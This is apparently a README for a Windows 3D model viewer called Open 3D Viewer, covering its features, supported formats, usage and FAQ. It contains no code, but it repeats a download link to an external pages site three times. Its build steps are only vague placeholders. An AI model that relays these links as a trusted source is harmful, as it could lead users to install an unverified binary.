# Open 3D Viewer v0.1.0 - 3D file viewer 2026

> **Open 3D Viewer is a Windows desktop app built for local-first inspection of 3D assets, using Three.js for rendering and focusing in this first v0.1.0 release on quick model viewing and useful import coverage.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/wardethan2004/open-3d-viewer-win?style=flat-square)](https://github.com/wardethan2004/open-3d-viewer-win)

---

<p align="center">
  <a href="https://wardethan2004.github.io/open-3d-viewer-win/">
    <img src="https://img.shields.io/badge/Download-Open%203D%20Viewer%20Latest-brightgreen?style=for-the-badge" alt="Download Open 3D Viewer">
  </a>
</p>

> **[Direct Download - Open 3D Viewer v0.1.0](https://wardethan2004.github.io/open-3d-viewer-win/)**

---

[Download Latest Build](https://wardethan2004.github.io/open-3d-viewer-win/)

---

## About Open 3D Viewer

Open 3D Viewer is made for opening and reviewing 3D files on Windows without depending on an internet-based workflow. Its local-first design keeps assets on your machine while you inspect models, meshes, and CAD-focused formats in a clean desktop UI.

The application combines Tauri and Three.js to stay lightweight for everyday viewing. It suits artists, developers, technical users, and anyone who needs a simple way to examine common 3D formats, adjust view settings, and save screenshots without leaving the app.

---

## Features

- Drag and drop support for fast model loading
- Support for GLB, GLTF, FBX, OBJ, STL, PLY, USD, STEP, IGES, HDR, EXR, and OpenSCAD
- PBR rendering with environment lighting for better material viewing
- Orbit, pan, and zoom navigation controls
- Toggle wireframe, grid, and auto-rotate modes
- Auto-frame and reset-view actions for easier scene inspection
- Export PNG screenshots from the viewer
- Recent files and settings persistence for repeat sessions
- File associations available during installation

---

## Installation

Grab the latest Windows build from the release link above, or clone the repository if you prefer to build it yourself.

To get started from source:

1. Clone the repository
2. Install the project dependencies
3. Launch the desktop app with the provided development or build command for your environment

If you use the packaged release, the quickest way to begin is to open a supported 3D file or drag it onto the app window.

---

## Usage

Typical workflow:

1. Open the app
2. Drag a supported file into the window, or use the file picker
3. Use orbit, pan, and zoom to inspect the model
4. Toggle wireframe or grid when you need a clearer structural view
5. Use auto-frame to center the object and reset view if needed
6. Export a PNG screenshot when you want to share a view

The viewer is intended for fast review of local assets, so you can switch between recent files and keep your preferred settings across sessions.

---

## Configuration

The application stores settings and recent file history locally.

If file associations are enabled during installation, supported formats can be opened directly from the Windows shell. Other display preferences, view toggles, and session behavior are managed inside the app and preserved between runs.

---

## Requirements

- Windows desktop environment
- A compatible runtime/build setup for the Tauri-based application when building from source
- Sufficient local storage for 3D assets, textures, and exported screenshots
- Supported input formats such as GLB, GLTF, FBX, OBJ, STL, PLY, USD, STEP, IGES, HDR, EXR, or OpenSCAD files

---

## FAQ

**Does it work offline?**  
Yes. The app is built around a local-first workflow for viewing files stored on your machine.

**Which formats can I open?**  
It supports a broad set of model and CAD-oriented formats, including GLB, GLTF, FBX, OBJ, STL, PLY, USD, STEP, IGES, HDR, EXR, and OpenSCAD.

**How do I update it?**  
Download the latest build from the release link and replace your current installation as instructed for your platform.

**Where are my settings saved?**  
Preferences and recent files are stored locally by the application.

**What should I try if a file does not load correctly?**  
Check that the format is supported, confirm the file is not corrupted, and try resetting the view or reopening the asset.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
